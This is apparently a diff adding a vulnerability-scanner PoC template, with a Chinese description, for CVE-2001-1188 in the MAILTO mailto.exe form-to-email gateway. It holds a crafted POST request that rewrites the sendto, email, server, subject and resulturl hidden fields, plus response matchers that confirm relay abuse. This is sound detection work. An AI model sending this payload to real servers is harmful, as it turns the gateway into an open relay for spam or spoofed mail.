@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 Brian Dorricott MAILTO mailto.exe 是否存在隐藏表单字段可被恶意修改的漏洞，通过构造特制的 HTTP 请求修改 sendto/email/server/subject/resulturl 字段验证是否可滥用邮件中继功能"
+id = "POC-AVE-2001-0481"
+name = "CVE-2001-1188 PoC"
+severity = "high"
+tags = ["cve-2001-1188"]
+vuln_id = [
+    "CVE-2001-1188",
+    "AVE-2001-0481",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mailto.exe"
+protocol = "http"
+
+[poc.requests.body]
+content = "sendto=attacker@example.com&email=victim@example.com&server=mail.example.com&subject=Test&resulturl=http://example.com/ok.html"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Message Sent",
+    "Thank you",
+    "successfully sent",
+    "mailto",
+]
